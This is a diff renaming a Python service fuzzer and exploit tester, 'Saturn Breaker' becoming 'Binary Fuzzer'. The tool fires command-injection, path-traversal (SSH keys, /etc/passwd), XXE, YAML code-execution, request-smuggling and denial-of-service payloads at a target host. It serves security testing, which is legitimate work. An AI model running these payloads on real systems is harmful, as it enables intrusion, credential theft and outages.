@@ -1,7 +1,7 @@
 """
-Saturn Breaker - Comprehensive fuzzer and exploit tester for C++ binary services.
+Binary Fuzzer - Comprehensive fuzzer and exploit tester for binary services.
 
-Targets common C++ vulnerabilities:
+Targets common C/C++ vulnerabilities:
 - Buffer overflows (stack & heap)
 - Format string attacks
 - Integer overflows
@@ -14,8 +14,8 @@ Targets common C++ vulnerabilities:
 - Deserialization attacks
 
 Usage:
-    python -m saturn_analyzer.saturn_breaker --host <IP> --port <PORT>
-    python -m saturn_analyzer.saturn_breaker --host <IP> --discover
+    python -m security_analyzer.binary_fuzzer --host <IP> --port <PORT>
+    python -m security_analyzer.binary_fuzzer --host <IP> --discover
 """
 
 import socket
@@ -25,7 +25,6 @@ import time
 import json
 import random
 import string
-import itertools
 import concurrent.futures
 import urllib.request
 import urllib.error
@@ -83,8 +82,8 @@ class BreakReport:
             self.anomalies += 1
 
 
-class SaturnBreaker:
-    """Comprehensive fuzzer/breaker for C++ binary services."""
+class BinaryFuzzer:
+    """Comprehensive fuzzer/breaker for binary services."""
 
     def __init__(self, host: str, port: int, timeout: int = 5, verbose: bool = True):
         self.host = host
@@ -97,10 +96,7 @@ class SaturnBreaker:
         if self.verbose:
             print(f"  {msg}")
 
-    # ─── Helpers ────────────────────────────────────────────────
-
     def _tcp_send(self, payload: bytes, timeout: int = None) -> tuple[bytes, float, bool]:
-        """Send raw TCP payload. Returns (response, time_ms, connection_reset)."""
         t = timeout or self.timeout
         start = time.time()
         try:
@@ -127,7 +123,6 @@ class SaturnBreaker:
 
     def _http_send(self, method: str, path: str, headers: dict = None,
                    body: bytes = None) -> tuple[int, str, float]:
-        """Send HTTP request. Returns (status_code, response_body, time_ms)."""
         url = f"http://{self.host}:{self.port}{path}"
         start = time.time()
         try:
@@ -171,10 +166,9 @@ class SaturnBreaker:
         status = "CRASH" if crashed else ("ANOMALY" if anomaly else "OK")
         self.log(f"[{status}] {name} ({time_ms:.0f}ms)")
 
-    # ─── 1. Buffer Overflow Tests ───────────────────────────────
+    # --- 1. Buffer Overflow Tests ---
 
     def test_buffer_overflows(self):
-        """Test for stack and heap buffer overflows with various payload sizes."""
         print("\n[1/13] Buffer Overflow Tests")
         payloads = [
             ("Small overflow (256B)", b"A" * 256),
@@ -196,10 +190,9 @@ class SaturnBreaker:
             self._record(AttackCategory.BUFFER_OVERFLOW, name,
                          f"{len(payload)} bytes", resp, ms, crashed)
 
-    # ─── 2. Format String Tests ─────────────────────────────────
+    # --- 2. Format String Tests ---
 
     def test_format_strings(self):
-        """Test for format string vulnerabilities (printf-family exploits)."""
         print("\n[2/13] Format String Tests")
         payloads = [
             ("Basic %x leak", b"%x." * 50),
@@ -221,10 +214,9 @@ class SaturnBreaker:
             self._record(AttackCategory.FORMAT_STRING, name,
                          payload[:80].decode(errors="replace"), resp, ms, crashed)
 
-    # ─── 3. Integer Overflow Tests ──────────────────────────────
+    # --- 3. Integer Overflow Tests ---
 
     def test_integer_overflows(self):
-        """Test for integer overflow/underflow conditions."""
         print("\n[3/13] Integer Overflow Tests")
         int_payloads = [
             ("INT32_MAX", str(2**31 - 1)),
@@ -242,14 +234,10 @@ class SaturnBreaker:
             ("Infinity", "Infinity"),
             ("-Infinity", "-Infinity"),
         ]
-
         for name, val in int_payloads:
-            # Try as raw TCP
             resp, ms, crashed = self._tcp_send(val.encode())
             self._record(AttackCategory.INTEGER_OVERFLOW, f"TCP: {name}",
                          val, resp, ms, crashed)
-
-            # Try as HTTP parameter
             status, body, ms = self._http_send("GET", f"/?size={val}")
             crashed = status == 0 and "Connection" in body
             self._record(AttackCategory.INTEGER_OVERFLOW, f"HTTP param: {name}",
@@ -257,10 +245,9 @@ class SaturnBreaker:
                          body.encode() if isinstance(body, str) else body,
                          ms, crashed)
 
-    # ─── 4. Command Injection Tests ─────────────────────────────
+    # --- 4. Command Injection Tests ---
 
     def test_command_injection(self):
-        """Test for OS command injection vulnerabilities."""
         print("\n[4/13] Command Injection Tests")
         injections = [
             ("Semicolon", "; id"),
@@ -282,22 +269,15 @@ class SaturnBreaker:
             ("Process list", "; ps aux"),
             ("Network info", "; ifconfig || ip addr"),
         ]
-
         for name, payload in injections:
-            # TCP raw
             resp, ms, crashed = self._tcp_send(payload.encode())
             self._record(AttackCategory.COMMAND_INJECTION, f"TCP: {name}",
                          payload, resp, ms, crashed)
-
-            # HTTP paths
             status, body, ms = self._http_send("GET", f"/{payload}")
             interesting = ("uid=" in body or "root:" in body or
                            "ec2-user" in body or status == 0)
             self._record(AttackCategory.COMMAND_INJECTION, f"HTTP path: {name}",
-                         payload, body.encode(), ms,
-                         crashed=interesting)
-
-            # HTTP headers
+                         payload, body.encode(), ms, crashed=interesting)
             status, body, ms = self._http_send(
                 "GET", "/",
                 headers={"X-Forwarded-For": payload, "User-Agent": payload}
@@ -305,10 +285,9 @@ class SaturnBreaker:
             self._record(AttackCategory.COMMAND_INJECTION, f"HTTP header: {name}",
                          payload, body.encode(), ms, crashed=False)
 
-    # ─── 5. Path Traversal Tests ────────────────────────────────
+    # --- 5. Path Traversal Tests ---
 
     def test_path_traversal(self):
-        """Test for directory traversal / file inclusion."""
         print("\n[5/13] Path Traversal Tests")
         traversals = [
             ("Basic ../", "../../../etc/passwd"),
@@ -325,29 +304,24 @@ class SaturnBreaker:
             ("Absolute path", "/etc/passwd"),
             ("Home dir", "../../../home/ec2-user/.ssh/authorized_keys"),
             ("SSH keys", "../../../root/.ssh/id_rsa"),
-            ("Config files", "../../../opt/saturn/config.yaml"),
+            ("Config files", "../../../opt/app/config.yaml"),
             ("Log files", "../../../var/log/syslog"),
         ]
-
         for name, path in traversals:
-            # HTTP GET
             status, body, ms = self._http_send("GET", f"/{path}")
             leaked = ("root:" in body or "ec2-user" in body or
                       "ssh-" in body or "BEGIN" in body)
             self._record(AttackCategory.PATH_TRAVERSAL, f"GET: {name}",
                          path, body.encode(), ms, crashed=leaked)
-
-            # TCP raw
             resp, ms, crashed = self._tcp_send(
                 f"GET /{path} HTTP/1.0\r\nHost: {self.host}\r\n\r\n".encode()
             )
             self._record(AttackCategory.PATH_TRAVERSAL, f"TCP: {name}",
                          path, resp, ms, crashed)
 
-    # ─── 6. Protocol Fuzzing ────────────────────────────────────
+    # --- 6. Protocol Fuzzing ---
 
     def test_protocol_fuzzing(self):
-        """Fuzz the wire protocol with malformed data."""
         print("\n[6/13] Protocol Fuzzing Tests")
         payloads = [
             ("Empty payload", b""),
@@ -372,19 +346,15 @@ class SaturnBreaker:
             ("MessagePack-like", b"\xdf\xff\xff\xff\xff" + b"A" * 100),
             ("gRPC frame", b"\x00" + struct.pack(">I", 999999) + b"A" * 100),
         ]
-
         for name, payload in payloads:
             resp, ms, crashed = self._tcp_send(payload)
             self._record(AttackCategory.PROTOCOL_FUZZING, name,
                          f"{len(payload)}B binary", resp, ms, crashed)
 
-    # ─── 7. DoS Tests ───────────────────────────────────────────
+    # --- 7. DoS Tests ---
 
     def test_dos_patterns(self):
-        """Test for denial of service vulnerabilities."""
         print("\n[7/13] Denial of Service Tests")
-
-        # Slowloris - partial HTTP headers
         self.log("Testing Slowloris (slow headers)...")
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -401,14 +371,12 @@ class SaturnBreaker:
             self._record(AttackCategory.DOS, "Slowloris", str(e),
                          str(e).encode(), 0, False)
 
-        # Large Content-Length with small body
         resp, ms, crashed = self._tcp_send(
             b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 999999999\r\n\r\nshort"
         )
         self._record(AttackCategory.DOS, "Huge Content-Length mismatch",
                      "CL:999999999, body:5B", resp, ms, crashed)
 
-        # Chunked encoding abuse
         resp, ms, crashed = self._tcp_send(
             b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
             b"FFFFFFFE\r\n" + b"A" * 1024 + b"\r\n0\r\n\r\n"
@@ -416,7 +384,6 @@ class SaturnBreaker:
         self._record(AttackCategory.DOS, "Chunked encoding overflow",
                      "chunk size 0xFFFFFFFE", resp, ms, crashed)
 
-        # Request flood (10 rapid connections)
         self.log("Testing rapid connection flood...")
         start = time.time()
         crash_count = 0
@@ -430,7 +397,6 @@ class SaturnBreaker:
                      f"{crash_count}/10 failed".encode(), elapsed,
                      crash_count > 5)
 
-        # Regex DoS (ReDoS) patterns
         redos_payloads = [
             ("ReDoS: aaa...a!", "a" * 50 + "!"),
             ("ReDoS: nested groups", "(" * 30 + "a" + ")" * 30),
@@ -444,14 +410,13 @@ class SaturnBreaker:
             self._record(AttackCategory.DOS, name, payload[:80],
                          resp, ms, crashed or slow)
 
-    # ─── 8. Memory Corruption ───────────────────────────────────
+    # --- 8. Memory Corruption ---
 
     def test_memory_corruption(self):
-        """Test for heap corruption, use-after-free, double-free patterns."""
         print("\n[8/13] Memory Corruption Tests")
         payloads = [
             ("Heap spray (NOP sled)", b"\x90" * 65536),
-            ("Shellcode-like pattern", b"\xcc" * 4096),  # INT3 breakpoints
+            ("Shellcode-like pattern", b"\xcc" * 4096),
             ("Free chunk corruption", struct.pack("<QQ", 0x4141414141414141, 0x4242424242424242) * 512),
             ("tcache poison pattern", struct.pack("<Q", 0x0000deadbeef0000) * 1024),
             ("Double pointer deref", struct.pack("<Q", 0) * 512),
@@ -462,19 +427,15 @@ class SaturnBreaker:
             ("Canary brute force", b"\x00" * 8 + b"A" * 1016),
             ("Large allocation trigger", b"X" * (10 * 1024 * 1024)),
         ]
-
         for name, payload in payloads:
             resp, ms, crashed = self._tcp_send(payload)
             self._record(AttackCategory.MEMORY_CORRUPTION, name,
                          f"{len(payload)}B", resp, ms, crashed)
 
-    # ─── 9. Race Condition Tests ────────────────────────────────
+    # --- 9. Race Condition Tests ---
 
     def test_race_conditions(self):
-        """Test for TOCTOU and race conditions via concurrent requests."""
         print("\n[9/13] Race Condition Tests")
-
-        # Parallel identical requests
         self.log("Testing 20 parallel identical requests...")
         results = []
         start = time.time()
@@ -489,7 +450,6 @@ class SaturnBreaker:
                      f"20 threads, {crashes} crashes",
                      f"{crashes}/20 crashed".encode(), elapsed, crashes > 0)
 
-        # Parallel different operations
         ops = [
             b"GET / HTTP/1.0\r\n\r\n",
             b"POST / HTTP/1.0\r\nContent-Length: 5\r\n\r\nhello",
@@ -508,13 +468,11 @@ class SaturnBreaker:
                      f"GET/POST/PUT/DELETE mixed, {crashes} crashes",
                      f"{crashes}/20 crashed".encode(), elapsed, crashes > 0)
 
-    # ─── 10. Deserialization Tests ──────────────────────────────
+    # --- 10. Deserialization Tests ---
 
     def test_deserialization(self):
-        """Test for insecure deserialization (JSON, XML, protobuf, msgpack)."""
         print("\n[10/13] Deserialization Tests")
         payloads = [
-            # JSON attacks
             ("JSON: __proto__ pollution", json.dumps({"__proto__": {"admin": True}})),
             ("JSON: constructor pollution", json.dumps({"constructor": {"prototype": {"isAdmin": True}}})),
             ("JSON: huge string value", json.dumps({"data": "A" * 100000})),
@@ -522,8 +480,6 @@ class SaturnBreaker:
             ("JSON: negative array index", json.dumps({"arr": [-1]})),
             ("JSON: type confusion", json.dumps({"id": True, "count": "not_a_number", "data": None})),
             ("JSON: unicode escape", json.dumps({"cmd": "\u0000\u0001\u0002"})),
-
-            # XML attacks
             ("XML: XXE file read",
              '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
             ("XML: XXE SSRF",
@@ -531,19 +487,14 @@ class SaturnBreaker:
             ("XML: Billion laughs",
              '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY l "lol"><!ENTITY l2 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">]><root>&l3;</root>'),
             ("XML: CDATA injection", '<root><![CDATA[<script>alert(1)</script>]]></root>'),
-
-            # Binary/serialization
             ("Pickle RCE marker", b"\x80\x04\x95" + b"\x00" * 20),
             ("Java serialized header", b"\xac\xed\x00\x05"),
             ("PHP serialized", b'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'),
             ("YAML: code exec", b"!!python/object/apply:os.system ['id']"),
         ]
-
         for name, payload in payloads:
             if isinstance(payload, str):
                 payload = payload.encode()
-
-            # Try as HTTP POST with various content types
             for ct in ["application/json", "application/xml", "text/xml",
                        "application/x-www-form-urlencoded"]:
                 status, body, ms = self._http_send(
@@ -558,52 +509,41 @@ class SaturnBreaker:
                              payload[:80].decode(errors="replace"),
                              body.encode(), ms, crashed=leaked)
 
-    # ─── 11. HTTP Abuse Tests ───────────────────────────────────
+    # --- 11. HTTP Abuse Tests ---
 
     def test_http_abuse(self):
-        """Test for HTTP-specific vulnerabilities."""
         print("\n[11/13] HTTP Abuse Tests")
-
         tests = [
-            # Request smuggling
             ("CL.TE smuggling",
              b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 6\r\n"
              b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
             ("TE.CL smuggling",
              b"POST / HTTP/1.1\r\nHost: x\r\n"
              b"Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nA\r\n0\r\n\r\n"),
-            # Header injection
             ("CRLF injection in header",
              b"GET / HTTP/1.1\r\nHost: x\r\nX-Inject: val\r\nEvil-Header: injected\r\n\r\n"),
             ("Host header injection",
              b"GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"),
-            # Method abuse
             ("TRACE method", b"TRACE / HTTP/1.1\r\nHost: x\r\n\r\n"),
             ("OPTIONS method", b"OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n"),
             ("CONNECT tunnel", b"CONNECT evil.com:443 HTTP/1.1\r\nHost: x\r\n\r\n"),
             ("Custom method", b"FOOBAR / HTTP/1.1\r\nHost: x\r\n\r\n"),
-            # URL abuse
             ("Long URL (8KB)", f"GET /{'A' * 8192} HTTP/1.1\r\nHost: x\r\n\r\n".encode()),
             ("Long URL (64KB)", f"GET /{'A' * 65536} HTTP/1.1\r\nHost: x\r\n\r\n".encode()),
             ("Many headers (200)", b"GET / HTTP/1.1\r\nHost: x\r\n" +
              b"".join(f"X-H-{i}: {'V' * 100}\r\n".encode() for i in range(200)) + b"\r\n"),
             ("Huge header value", f"GET / HTTP/1.1\r\nHost: x\r\nX-Big: {'A' * 65536}\r\n\r\n".encode()),
-            # SSRF via headers
             ("X-Forwarded-Host SSRF", b"GET / HTTP/1.1\r\nHost: x\r\nX-Forwarded-Host: 169.254.169.254\r\n\r\n"),
         ]
-
         for name, payload in tests:
             resp, ms, crashed = self._tcp_send(payload)
             self._record(AttackCategory.HTTP_ABUSE, name,
                          f"{len(payload)}B", resp, ms, crashed)
 
-    # ─── 12. Auth Bypass Tests ──────────────────────────────────
+    # --- 12. Auth Bypass Tests ---
 
     def test_auth_bypass(self):
-        """Test for authentication bypass techniques."""
         print("\n[12/13] Authentication Bypass Tests")
-
-        # Try accessing endpoints without auth
         endpoints = [
             "/", "/admin", "/api", "/api/v1", "/health", "/healthz",
             "/metrics", "/prometheus", "/debug", "/debug/pprof",
@@ -613,7 +553,6 @@ class SaturnBreaker:
             "/internal", "/private", "/secret", "/dashboard",
             "/.env", "/wp-admin", "/phpmyadmin", "/server-status",
         ]
-
         for ep in endpoints:
             status, body, ms = self._http_send("GET", ep)
             accessible = status in (200, 301, 302, 307)
@@ -621,7 +560,6 @@ class SaturnBreaker:
                          f"HTTP {status}", body[:200].encode(), ms,
                          crashed=accessible and ep not in ("/", "/health", "/healthz"))
 
-        # Auth header tricks
         auth_tricks = [
             ("No auth", {}),
             ("Empty Bearer", {"Authorization": "Bearer "}),
@@ -633,7 +571,6 @@ class SaturnBreaker:
             ("X-API-Key: admin", {"X-API-Key": "admin"}),
             ("X-API-Key: test", {"X-API-Key": "test"}),
         ]
-
         for name, headers in auth_tricks:
             status, body, ms = self._http_send("GET", "/admin", headers=headers)
             bypassed = status in (200, 301, 302)
@@ -641,13 +578,10 @@ class SaturnBreaker:
                          f"HTTP {status}", body[:200].encode(), ms,
                          crashed=bypassed)
 
-    # ─── 13. Info Disclosure Tests ──────────────────────────────
+    # --- 13. Info Disclosure Tests ---
 
     def test_info_disclosure(self):
-        """Test for information disclosure vulnerabilities."""
         print("\n[13/13] Information Disclosure Tests")
-
-        # Error triggering
         error_triggers = [
             ("404 error page", "/nonexistent_" + "".join(random.choices(string.ascii_lowercase, k=10))),
             ("500 error trigger", "/%00"),
@@ -667,29 +601,26 @@ class SaturnBreaker:
             ("crossdomain.xml", "/crossdomain.xml"),
             (".well-known/security.txt", "/.well-known/security.txt"),
         ]
-
         for name, path in error_triggers:
             status, body, ms = self._http_send("GET", path)
             leaky = any(kw in body.lower() for kw in [
                 "stack trace", "exception", "error at", "line ",
                 "segfault", "core dump", "version", "build",
-                "gcc", "g++", "clang", "saturn", "boost",
+                "gcc", "g++", "clang", "boost",
                 "/home/", "/opt/", "/usr/", "password", "token",
             ])
             self._record(AttackCategory.INFO_DISCLOSURE, name,
                          f"GET {path} -> {status}",
                          body[:300].encode(), ms, crashed=leaky)
 
-    # ─── Run All ────────────────────────────────────────────────
+    # --- Run All ---
 
     def run_all(self) -> BreakReport:
-        """Run all attack categories."""
         print(f"\n{'='*60}")
-        print(f" Saturn Breaker - C++ Binary Security Tester")
+        print(f" Binary Fuzzer - Service Security Tester")
         print(f" Target: {self.host}:{self.port}")
         print(f"{'='*60}")
 
-        # Check connectivity first
         resp, ms, crashed = self._tcp_send(b"GET / HTTP/1.0\r\n\r\n")
         if b"<TIMEOUT>" in resp and b"<REFUSED>" in resp:
             print(f"\n[!] Cannot connect to {self.host}:{self.port}")
@@ -711,7 +642,6 @@ class SaturnBreaker:
             self.test_auth_bypass,
             self.test_info_disclosure,
         ]
-
         for test_fn in tests:
             try:
                 test_fn()
@@ -741,10 +671,8 @@ class SaturnBreaker:
                     print()
 
     def generate_report(self, output_dir: str = "./reports"):
-        """Generate JSON and Markdown reports."""
         os.makedirs(output_dir, exist_ok=True)
 
-        # JSON report
         json_data = {
             "target": f"{self.host}:{self.port}",
             "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
@@ -775,13 +703,12 @@ class SaturnBreaker:
                 for a in self.report.attempts
             ],
         }
-        json_path = os.path.join(output_dir, "saturn-breaker-report.json")
+        json_path = os.path.join(output_dir, "binary-fuzzer-report.json")
         with open(json_path, "w") as f:
             json.dump(json_data, f, indent=2)
 
-        # Markdown report
         md_lines = [
-            "# Saturn Breaker Report",
+            "# Binary Fuzzer Report",
             "",
             f"**Target:** `{self.host}:{self.port}`",
             f"**Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}",
@@ -837,7 +764,7 @@ class SaturnBreaker:
         for cat, s in sorted(cat_stats.items()):
             md_lines.append(f"| {cat} | {s['total']} | {s['crashes']} | {s['anomalies']} |")
 
-        md_path = os.path.join(output_dir, "saturn-breaker-report.md")
+        md_path = os.path.join(output_dir, "binary-fuzzer-report.md")
         with open(md_path, "w") as f:
             f.write("\n".join(md_lines))
 
@@ -848,35 +775,22 @@ class SaturnBreaker:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Saturn Breaker - C++ Binary Security Fuzzer",
+        description="Binary Fuzzer - Service Security Tester",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Test Saturn on a specific port
-  python -m saturn_analyzer.saturn_breaker --host 13.200.186.29 --port 8080
-
-  # Discover open ports first, then test
-  python -m saturn_analyzer.saturn_breaker --host 13.200.186.29 --discover
-
-  # Test with longer timeout
-  python -m saturn_analyzer.saturn_breaker --host 13.200.186.29 --port 3000 --timeout 10
-
-  # Quick test (buffer overflow + format string only)
-  python -m saturn_analyzer.saturn_breaker --host 13.200.186.29 --port 8080 --quick
+  python -m security_analyzer.binary_fuzzer --host <IP> --port 8080
+  python -m security_analyzer.binary_fuzzer --host <IP> --discover
+  python -m security_analyzer.binary_fuzzer --host <IP> --port 8080 --quick
         """,
     )
     parser.add_argument("--host", required=True, help="Target host")
     parser.add_argument("--port", type=int, help="Target port")
-    parser.add_argument("--discover", action="store_true",
-                        help="Discover open ports first")
-    parser.add_argument("--timeout", type=int, default=5,
-                        help="Connection timeout (default: 5s)")
-    parser.add_argument("--output", default="./reports",
-                        help="Output directory (default: ./reports)")
-    parser.add_argument("--quick", action="store_true",
-                        help="Quick test (buffer overflow + format string only)")
-    parser.add_argument("--quiet", action="store_true",
-                        help="Suppress per-test output")
+    parser.add_argument("--discover", action="store_true", help="Discover open ports first")
+    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout (default: 5s)")
+    parser.add_argument("--output", default="./reports", help="Output directory (default: ./reports)")
+    parser.add_argument("--quick", action="store_true", help="Quick test (buffer overflow + format string only)")
+    parser.add_argument("--quiet", action="store_true", help="Suppress per-test output")
 
     args = parser.parse_args()
 
@@ -894,7 +808,7 @@ Examples:
                     s.settimeout(3)
                     if s.connect_ex((args.host, p)) == 0:
                         return p
-            except:
+            except Exception:
                 pass
             return None
 
@@ -910,24 +824,24 @@ Examples:
 
         for port in open_ports:
             print(f"\n[*] Testing port {port}...")
-            breaker = SaturnBreaker(args.host, port, args.timeout, not args.quiet)
-            breaker.run_all()
-            breaker.generate_report(args.output)
+            fuzzer = BinaryFuzzer(args.host, port, args.timeout, not args.quiet)
+            fuzzer.run_all()
+            fuzzer.generate_report(args.output)
     else:
         if not args.port:
             print("ERROR: --port is required (or use --discover)")
             sys.exit(1)
 
-        breaker = SaturnBreaker(args.host, args.port, args.timeout, not args.quiet)
+        fuzzer = BinaryFuzzer(args.host, args.port, args.timeout, not args.quiet)
 
         if args.quick:
-            breaker.test_buffer_overflows()
-            breaker.test_format_strings()
-            breaker._print_summary()
+            fuzzer.test_buffer_overflows()
+            fuzzer.test_format_strings()
+            fuzzer._print_summary()
         else:
-            breaker.run_all()
+            fuzzer.run_all()
 
-        breaker.generate_report(args.output)
+        fuzzer.generate_report(args.output)
 
 
 if __name__ == "__main__":
